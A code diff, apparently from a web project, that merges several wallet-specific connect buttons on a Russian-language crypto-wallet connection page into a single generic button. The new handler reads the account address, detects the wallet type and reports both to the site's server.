@@ -11,35 +11,19 @@
 <body>
     <div class="container">
         <div class="header">
-           <div class="logo">🔐</div>
-        <img src="{{ url_for('static', filename='icons/logo-removebg.png') }}" alt="TIT4N Crypto Forge Logo">
-
-
+            <div class="logo">🔐</div>
+            <img src="{{ url_for('static', filename='icons/logo-removebg.png') }}" alt="TIT4N Crypto Forge Logo">
             <div class="network-indicator" id="networkIndicator">● Online</div>
         </div>
 
         <div class="card">
             <h1 class="title">Подключите ваш криптокошелек</h1>
-            <p class="subtitle">Выберите провайдера из списка ниже</p>
+            <p class="subtitle">Нажмите кнопку ниже для подключения</p>
 
             <div class="wallet-grid">
-                <!--
-                <button class="wallet-button" id="connectMetaMask">
-                    <img src="{{ url_for('static', filename='icons/metamask.png') }}" alt="MetaMask">
-                    <span>MetaMask</span>
-                </button>
-                <button class="wallet-button" id="connectOKX">
-                    <img src="{{ url_for('static', filename='icons/okx.png') }}" alt="OKX">
-                    <span>OKX Wallet</span>
-                </button>
-                <button class="wallet-button" id="connectTronLink">
-                    <img src="{{ url_for('static', filename='icons/tronlink.png') }}" alt="TronLink">
-                    <span>TronLink</span>
-                </button>
-                <-->
-                <button class="wallet-button full-width" id="connectMetaMask">
-                    <img src="{{ url_for('static', filename='icons/trustwallet.png') }}" alt="Trust Wallet">
-                    <span>Trust Wallet</span>
+                <button class="wallet-button full-width" id="connectWallet">
+                    <img src="{{ url_for('static', filename='icons/wallet.png') }}" alt="Wallet">
+                    <span>Подключить кошелек</span>
                 </button>
             </div>
 
@@ -56,7 +40,7 @@
 
             <div class="additional-info">
                 <p>🔒 Безопасное подключение к вашему криптокошельку.</p>
-                <p>💡 Поддерживаются ведущие провайдеры кошельков.</p>
+                <p>💡 Поддерживаются все популярные провайдеры кошельков.</p>
                 <p>🚀 Начните использовать децентрализованные приложения уже сегодня!</p>
             </div>
         </div>
@@ -91,82 +75,41 @@
                 }
             }
 
-            async function connectMetaMask() {
+            async function connectWallet() {
                 try {
-                    if (!window.ethereum || !window.ethereum.isMetaMask) {
-                        throw new Error("Пожалуйста, установите MetaMask!");
+                    // Перевірка наявності провайдера (MetaMask, Trust Wallet, OKX тощо)
+                    if (!window.ethereum) {
+                        throw new Error("Пожалуйста, установите криптокошелек (например, MetaMask, Trust Wallet или OKX)!");
                     }
 
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const accounts = await provider.send("eth_requestAccounts", []);
 
-                    statusText.textContent = "✅ Подключено (MetaMask)";
-                    walletAddress.textContent = accounts[0];
-                    await sendToServer(accounts[0], "MetaMask");
-                } catch (error) {
-                    statusText.textContent = "❌ Ошибка подключения";
-                    alert(error.message);
-                }
-            }
-
-            async function connectOKX() {
-                try {
-                    if (!window.okxwallet) throw new Error("Пожалуйста, установите OKX Wallet!");
-
-                    const accounts = await window.okxwallet.request({
-                        method: "eth_requestAccounts"
-                    });
-
-                    statusText.textContent = "✅ Подключено (OKX Wallet)";
-                    walletAddress.textContent = accounts[0];
-                    await sendToServer(accounts[0], "OKX Wallet");
-                } catch (error) {
-                    statusText.textContent = "❌ Ошибка подключения";
-                    alert(error.message);
-                }
-            }
-
-            async function connectTronLink() {
-                try {
-                    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                        throw new Error("Пожалуйста, установите TronLink!");
+                    // Визначення типу гаманця
+                    let walletType = "Unknown";
+                    if (window.ethereum.isMetaMask) {
+                        walletType = "MetaMask";
+                    } else if (window.ethereum.isTrust) {
+                        walletType = "Trust Wallet";
+                    } else if (window.okxwallet) {
+                        walletType = "OKX Wallet";
+                    } else if (window.tronWeb) {
+                        walletType = "TronLink";
                     }
 
-                    const address = window.tronWeb.defaultAddress.base58;
-                    statusText.textContent = "✅ Подключено (TronLink)";
-                    walletAddress.textContent = address;
-                    await sendToServer(address, "TronLink");
-                } catch (error) {
-                    statusText.textContent = "❌ Ошибка подключения";
-                    alert(error.message);
-                }
-            }
-
-            async function connectTrustWallet() {
-                try {
-                    if (!window.ethereum?.isTrust) {
-                        throw new Error("Пожалуйста, установите Trust Wallet!");
-                    }
-
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const accounts = await provider.send("eth_requestAccounts", []);
-
-                    statusText.textContent = "✅ Подключено (Trust Wallet)";
+                    statusText.textContent = `✅ Подключено (${walletType})`;
                     walletAddress.textContent = accounts[0];
-                    await sendToServer(accounts[0], "Trust Wallet");
+                    await sendToServer(accounts[0], walletType);
                 } catch (error) {
                     statusText.textContent = "❌ Ошибка подключения";
                     alert(error.message);
                 }
             }
 
-            // Добавление обработчиков событий
-            document.getElementById("connectMetaMask").addEventListener("click", connectMetaMask);
-            document.getElementById("connectOKX").addEventListener("click", connectOKX);
-            document.getElementById("connectTronLink").addEventListener("click", connectTronLink);
-            document.getElementById("connectTrustWallet").addEventListener("click", connectTrustWallet);
+            // Додавання обробника подій для універсальної кнопки
+            document.getElementById("connectWallet").addEventListener("click", connectWallet);
 
-            // Инициализация проверки сети
+            // Ініціалізація перевірки мережі
             if (window.ethereum) {
                 window.ethereum.on('chainChanged', () => window.location.reload());
                 document.getElementById("networkIndicator").classList.add("online");
